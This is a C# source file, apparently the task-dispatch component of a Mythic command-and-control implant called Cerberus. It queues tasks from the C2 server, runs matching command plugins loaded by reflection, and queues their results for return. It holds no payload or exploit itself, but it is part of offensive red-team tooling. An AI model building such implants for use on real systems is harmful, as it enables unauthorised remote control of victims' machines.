using Models.Tasks;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Tasking
{
    public class TaskHandler
    {
        public static ConcurrentQueue<MythicTask> Inbound = new ConcurrentQueue<MythicTask>();
        public static ConcurrentQueue<MythicTaskResult> Outbound = new ConcurrentQueue<MythicTaskResult>();
        public static List<CerberusCommand> _commands = new List<CerberusCommand>();

        public TaskHandler()
        {

        }

        public void Init()
        {
            LoadCerberusCommands();
        }

        public void HandleTasks(IEnumerable<MythicTask> tasks)
        {
            foreach (var task in tasks)
            {
                var result = HandleTask(task);
                AddTaskResultToOutbound(result);
            }
        }

        public static MythicTaskResult HandleTask(MythicTask task)
        {
            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.command, StringComparison.OrdinalIgnoreCase));

            MythicTaskResult result;

            if (command is null)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = "Command not found",
                    completed = true,
                    status = "error",
                    error = "Command not found"
                };

                return result;
            }

            try
            {
                result = command.Execute(task);
            }
            catch (Exception ex)
            {
                result = new MythicTaskResult
                {
                    task_id = task.id,
                    user_output = ex.Message,
                    completed = true,
                    status = "error",
                    error = ex.Message
                };
            }

            return result;
        }

        public void AddTaskToInbound(MythicTask task)
        {
            Inbound.Enqueue(task);
        }

        public void AddTaskResultToOutbound(MythicTaskResult result)
        {
            Outbound.Enqueue(result);
        }

        public bool InboundEmpty(out IEnumerable<MythicTask> tasks)
        {
            if (Inbound.IsEmpty)
            {
                tasks = null;
                return false;
            }

            var list = new List<MythicTask>();

            while (Inbound.TryDequeue(out var task))
            {
                list.Add(task);
            }

            tasks = list;
            return true;
        }

        public static IEnumerable<MythicTaskResult> GetOutbound()
        {
            var outbound = new List<MythicTaskResult>();

            while (Outbound.TryDequeue(out var result))
            {
                outbound.Add(result);
            }

            return outbound;
        }

        private static void LoadCerberusCommands()
        {
            var tasks = Assembly.Load("Tasks");

            foreach (var type in tasks.GetTypes())
            {
                if (type.IsSubclassOf(typeof(CerberusCommand)))
                {
                    var instance = (CerberusCommand)Activator.CreateInstance(type);
                    _commands.Add(instance);
                }
            }
        }
    }
}
